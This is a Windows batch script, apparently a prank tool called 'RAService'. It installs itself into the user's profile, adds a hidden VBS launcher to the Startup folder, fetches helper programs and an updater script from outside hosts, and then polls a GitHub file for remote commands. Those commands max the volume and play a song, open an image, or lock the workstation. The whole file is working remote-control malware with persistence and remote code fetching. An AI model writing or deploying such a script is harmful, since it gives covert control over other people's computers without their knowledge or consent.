@echo off

set docls=0
if not exist "%userprofile%\RAService\PCnum.sys" set PCnum=1000
if exist "%userprofile%\RAService\PCnum.sys" set /p PCnum=<"%userprofile%\RAService\PCnum.sys"
set file=https://raw.githubusercontent.com/FBW81C2/RAService/main/Computer%PCnum%.txt

if exist "%userprofile%"\RAService\maindrive.sys set /p maindrive=<"%userprofile%"\RAService\maindrive.sys

if not exist "%userprofile%\RAService" goto install
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RAService.vbs" goto install
if not exist "%userprofile%\RAService\wget\wget.exe" goto install
if not exist "%userprofile%\RAService\song.mp3" goto install
if not exist "%userprofile%\RAService\Gandalf.jpg" goto install
if not exist "%userprofile%\RAService\nircmd.exe" goto install


:main1
if exist "%userprofile%"\RAService\maindrive.sys set /p maindrive=<"%userprofile%"\RAService\maindrive.sys
:main
rem Add here that the github pc1 or so file will be downloaded and what happens
"%userprofile%\RAService\wget\wget.exe" %file% -O"%userprofile%\RAService\isonline.sys"
fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\isonline.sys"
if %errorlevel%==0 goto main
set /p which=<"%userprofile%\RAService\isonline.sys"
if %which%==0 goto again
if %which%==1 goto initRICK
if %which%==2 goto initGANDALF
if %which%==3 goto intiLOCK

:again
timeout 60
goto main

:initRICK
"%userprofile%\RAService\nircmd.exe" setsysvolume 65535
"%userprofile%\RAService\nircmd.exe" mutesysvolume 0
start "%userprofile%\RAService\cmdmp3.exe" "%userprofile%\RAService\song.mp3"
timeout 300
goto again

:initGANDALF
start "" "%userprofile%\RAService\Gandalf.jpg"
goto again

:initLOCK
rundll32.exe user32.dll, LockWorkStation
goto again





:install
if not exist "%userprofile%\RAService" md "%userprofile%\RAService"
if not exist "%userprofile%\RAService\wget" md "%userprofile%\RAService\wget"
if exist "%userprofile%\RAService\wget\wget.exe" goto everythingfine
if not exist "%userprofile%\RAService\local_version.sys" echo 1.0.0>"%userprofile%\RAService\local_version.sys"

if not exist "%userprofile%\RAService\PCnum.sys" echo %PCnum%>"%userprofile%\RAService\PCnum.sys"

powershell Invoke-WebRequest https://eternallybored.org/misc/wget/1.19.4/32/wget.exe -OutFile "%userprofile%\RAService\wget\wget.exe"
rem Generating MD5 Hash
echo Generating MD5 Hash
certutil -hashfile "%userprofile%\RAService\wget\wget.exe" MD5 | findstr /V ":" >"%userprofile%\RAService\wget\wgethash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo 3dadb6e2ece9c4b3e1e322e617658b60>"%userprofile%\RAService\wget\orginal_wgethash.sys"
fc "%userprofile%\RAService\wget\wgethash.sys" "%userprofile%\RAService\wget\orginal_wgethash.sys"
if %errorlevel%==0 goto everythingfine

echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\RAService\wget\wgethash.sys"
echo Expected Hash: 3dadb6e2ece9c4b3e1e322e617658b60
echo Returned Hash: %remotehash%

:ask1
echo Do you want to ignore and continue? (y/n)
set /p opt=Opt: 
if %opt%==y goto everythingfine
if %opt%==n goto fail1
goto ask1

:fail1
echo The Hash isn't the same. This could mean that the Provider replaced or edited the file	 or the servers are offline or you have no internet connection!
echo We will not continue this Programm. Press Any Key to exit!
pause
exit

:everythingfine
if not exist "%userprofile%\RAService\empty.sys" type nul>"%userprofile%\RAService\empty.sys"
if not exist "%userprofile%\RAService\RAServiceUpdater.bat" goto updaterinstall
if not exist "%userprofile%\RAService\nircmd.exe" goto nircmdinstall
if not exist "%userprofile%\RAService\cmdmp3.exe" goto cmdmp3install
if not exist "%userprofile%\RAService\song.mp3" goto songinstall
if not exist "%userprofile%\RAService\Gandalf.jpg" goto Gandalfinstall
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RAService.vbs" goto writevbs
goto finished



:updaterinstall
if not exist "%userprofile%\RAService\wget\wget.exe" goto install
"%userprofile%\RAService\wget\wget.exe" https://raw.githubusercontent.com/FBW81C2/RAService/main/RAServiceUpdater.bat -O"%userprofile%\RAService\RAServiceUpdater.bat"
fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\RAServiceUpdater.bat"
if %errorlevel%==1 goto everythingfine
goto updaterinstall




:nircmdinstall
if not exist "%userprofile%\RAService\wget\wget.exe" goto install
"%userprofile%\RAService\wget\wget.exe" https://www.nirsoft.net/utils/nircmd.zip -O"%userprofile%\RAService\nircmd.zip"
fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\nircmd.zip"
if %errorlevel%==0 goto nircmdinstall

powershell -Command "Expand-Archive \"%userprofile%\RAService\nircmd.zip\" -DestinationPath \"%userprofile%\RAService\""
del "%userprofile%\RAService\nircmd.zip" /f /q
del "%userprofile%\RAService\NirCmd.chm" /f /q
del "%userprofile%\RAService\nircmdc.exe" /f /q

echo Generating MD5 Hash
certutil -hashfile "%userprofile%\RAService\nircmd.exe" MD5 | findstr /V ":" >"%userprofile%\RAService\wget\nircmdhash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo a1cd6a64e8f8ad5d4b6c07dc4113c7ec>"%userprofile%\RAService\wget\orginal_nircmdhash.sys"
fc "%userprofile%\RAService\wget\nircmdhash.sys" "%userprofile%\RAService\wget\orginal_nircmdhash.sys"
if %errorlevel%==0 goto everythingfine

echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\RAService\wget\nircmdhash.sys"
echo Expected Hash: a1cd6a64e8f8ad5d4b6c07dc4113c7ec
echo Returned Hash: %remotehash%
goto ask1






:cmdmp3install
if not exist "%userprofile%\RAService\wget\wget.exe" goto install
"%userprofile%\RAService\wget\wget.exe" https://jiml.us/downloads/cmdmp3.zip -O"%userprofile%\RAService\cmdmp3.zip"
fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\cmdmp3.zip"
if %errorlevel%==0 goto cmdmp3install

powershell -Command "Expand-Archive \"%userprofile%\RAService\cmdmp3.zip\" -DestinationPath \"%userprofile%\RAService\""
del %userprofile%\RAService\cmdmp3.zip /q /f
del %userprofile%\RAService\cmdmp3.c /q /f
del %userprofile%\RAService\cmdmp3win.c /q /f
del %userprofile%\RAService\cmdmp3win.exe /q /f
ren %userprofile%\RAService\readme.txt readmecmdmp3.txt

echo Generating MD5 Hash
certutil -hashfile "%userprofile%\RAService\cmdmp3.exe" MD5 | findstr /V ":" >"%userprofile%\RAService\wget\cmdmp3hash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo f01f0a0bdb46224386b3a19787c457b7>"%userprofile%\RAService\wget\orginal_cmdmp3hash.sys"
fc "%userprofile%\RAService\wget\cmdmp3hash.sys" "%userprofile%\RAService\wget\orginal_cmdmp3hash.sys"
if %errorlevel%==0 goto everythingfine

echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\RAService\cmdmp3hash.sys"
echo Expected Hash: f01f0a0bdb46224386b3a19787c457b7
echo Returned Hash: %remotehash%
goto ask1


:Gandalfinstall
if not exist "%userprofile%\RAService\wget\wget.exe" goto install
"%userprofile%\RAService\wget\wget.exe" https://i.ytimg.com/vi/USa1coX7jVY/maxresdefault.jpg -O"%userprofile%\RAService\Gandalf.jpg"
if not exist "%userprofile%\RAService\Gandalf.jpg" "%userprofile%\RAService\wget\wget.exe" https://i.ytimg.com/vi/Ljf5H051tOw/maxresdefault.jpg -O"%userprofile%\RAService\Gandalf.jpg"
if not exist "%userprofile%\RAService\Gandalf.jpg" "%userprofile%\RAService\wget\wget.exe" https://i.ytimg.com/vi/ipEIdUod2_o/maxresdefault.jpg -O"%userprofile%\RAService\Gandalf.jpg"
if not exist "%userprofile%\RAService\Gandalf.jpg" "%userprofile%\RAService\wget\wget.exe" https://cdn.discordapp.com/attachments/695294025305030657/1119601554631176202/Gandalf.jpg -O"%userprofile%\RAService\Gandalf.jpg"
if not exist "%userprofile%\RAService\Gandalf.jpg" goto writevbs
fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\Gandalf.jpg"
if %errorlevel%==1 goto everythingfine
goto Gandalfinstall

:songinstall
echo %CD:~0,3%>%userprofile%\windowssysri\maindrive.sys
set maindrive=%CD:~0,3%

if exist %maindrive%files\song.mp3 copy %maindrive%files\song.mp3 "%userprofile%\RAService\song.mp3"
if exist "%userprofile%\RAService\song.mp3" goto everythingfine
echo File not found: %maindrive%files\song.mp3
echo Make sure that file is there!
pause
goto songinstall

:writevbs
set directory="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RAService.vbs"

echo Set WshShell = CreateObject^("WScript.Shell"^) > %directory%
echo WshShell.Run "%userprofile%\RAService\RAServiceUpdater.bat", 0, True >> %directory%
echo WshShell.Run "%userprofile%\RAService\RAService.bat", 0, True >> %directory%

:finished
if %docls%==1 cls
echo Successfully Installed!
echo Computer will now restart to complete Installation!
echo If you don't want to restart now just close Tab!
pause 
shutdown /r
